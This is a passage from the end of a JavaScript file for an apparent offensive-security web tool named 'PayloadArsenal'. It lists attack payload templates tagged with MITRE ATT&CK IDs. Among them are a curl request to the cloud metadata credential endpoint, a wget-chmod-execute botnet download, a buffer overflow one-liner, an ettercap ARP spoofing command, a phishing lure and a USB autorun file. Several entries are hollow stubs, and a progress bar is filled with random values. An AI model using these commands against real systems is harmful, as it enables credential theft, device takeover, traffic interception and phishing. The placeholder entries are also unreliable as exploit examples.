                    name: 'AWS Metadata Harvester',
                    description: 'Harvests AWS instance metadata',
                    template: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                    techniques: ['T1552.005'],
                    riskFactors: ['medium']
                }
            ]
        };
    }

    initIoTPayloads() {
        return {
            script: [
                {
                    id: 'mirai_variant',
                    name: 'IoT Botnet Payload',
                    description: 'IoT device compromise payload',
                    template: 'wget http://{TARGET_IP}:{TARGET_PORT}/bot; chmod +x bot; ./bot',
                    techniques: ['T1105'],
                    riskFactors: ['high']
                }
            ]
        };
    }

    initBlockchainPayloads() {
        return {
            script: [
                {
                    id: 'smart_contract_exploit',
                    name: 'Smart Contract Exploit',
                    description: 'Exploits vulnerable smart contracts',
                    template: 'function exploit() { selfdestruct(attacker); }',
                    techniques: ['T1190'],
                    riskFactors: ['high']
                }
            ]
        };
    }

    initAIMLPayloads() {
        return {
            script: [
                {
                    id: 'model_poisoning',
                    name: 'ML Model Poisoning',
                    description: 'Poisons machine learning training data',
                    template: 'adversarial_sample = generate_adversarial(original_input, target_model)',
                    techniques: ['T1565.002'],
                    riskFactors: ['medium']
                }
            ]
        };
    }

    initExploitsPayloads() {
        return {
            script: [
                {
                    id: 'buffer_overflow',
                    name: 'Buffer Overflow Exploit',
                    description: 'Classic buffer overflow exploitation',
                    template: 'python -c "print(\'A\' * 1024 + \'\\x90\' * 100 + shellcode)"',
                    techniques: ['T1203'],
                    riskFactors: ['high']
                }
            ]
        };
    }

    initKernelPayloads() {
        return {
            script: [
                {
                    id: 'kernel_exploit',
                    name: 'Kernel Privilege Escalation',
                    description: 'Exploits kernel vulnerabilities for privilege escalation',
                    template: './kernel_exploit && whoami',
                    techniques: ['T1068'],
                    riskFactors: ['high']
                }
            ]
        };
    }

    initNetworkPayloads() {
        return {
            script: [
                {
                    id: 'arp_spoof',
                    name: 'ARP Spoofing Attack',
                    description: 'Performs ARP spoofing for MITM attacks',
                    template: 'ettercap -T -M arp:remote /{TARGET_IP}// //gateway//',
                    techniques: ['T1557.002'],
                    riskFactors: ['medium']
                }
            ]
        };
    }

    initSocialEngPayloads() {
        return {
            script: [
                {
                    id: 'phishing_payload',
                    name: 'Phishing Email Template',
                    description: 'Social engineering phishing template',
                    template: 'Urgent: Your account will be suspended. Click here to verify: http://{TARGET_IP}:{TARGET_PORT}/phish',
                    techniques: ['T1566.002'],
                    riskFactors: ['high']
                }
            ]
        };
    }

    initPhysicalPayloads() {
        return {
            script: [
                {
                    id: 'usb_autorun',
                    name: 'USB Autorun Payload',
                    description: 'Executes payload when USB is inserted',
                    template: '[autorun]\nopen=payload.exe\naction=Open folder to view files',
                    techniques: ['T1091'],
                    riskFactors: ['medium']
                }
            ]
        };
    }

    initMITREPayloads() {
        return {
            script: [
                {
                    id: 'mitre_t1059',
                    name: 'Command and Scripting Interpreter',
                    description: 'MITRE T1059 technique implementation',
                    template: 'Various command interpreters for payload execution',
                    techniques: ['T1059'],
                    riskFactors: ['medium']
                }
            ]
        };
    }
}

// Initialize the application when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.payloadArsenal = new PayloadArsenal();
});

// Handle page visibility changes
document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
        window.payloadArsenal?.updateProgress(Math.random() * 100);
    }
});

// Handle online/offline status
window.addEventListener('online', () => {
    window.payloadArsenal?.showToast('Connection restored', 'success');
});

window.addEventListener('offline', () => {
    window.payloadArsenal?.showToast('Working offline', 'warning');
});

// Handle unload to save preferences
window.addEventListener('beforeunload', () => {
    window.payloadArsenal?.saveUserPreferences();
});
